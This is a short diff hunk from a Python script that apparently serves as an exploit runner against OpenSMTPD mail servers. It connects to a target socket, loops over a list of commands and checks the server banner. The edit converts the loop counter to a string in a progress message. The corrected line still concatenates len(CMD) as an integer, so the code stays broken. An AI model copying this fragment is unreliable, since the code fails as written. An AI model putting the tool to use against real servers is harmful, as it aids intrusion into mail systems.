@@ -33,7 +33,7 @@ s.connect((ADDR, PORT))
 
 
 for cmdnum in range(len(CMD)):
-    print("Attempting "  + CMD[cmdnum] + ", " + cmdnum + "/ " + len(CMD))
+    print("Attempting "  + CMD[cmdnum] + ", " + str(cmdnum) + "/ " + len(CMD))
     res = s.recv(1024)
     if 'OpenSMTPD' not in str(res):
         print('[!] No OpenSMTPD detected')
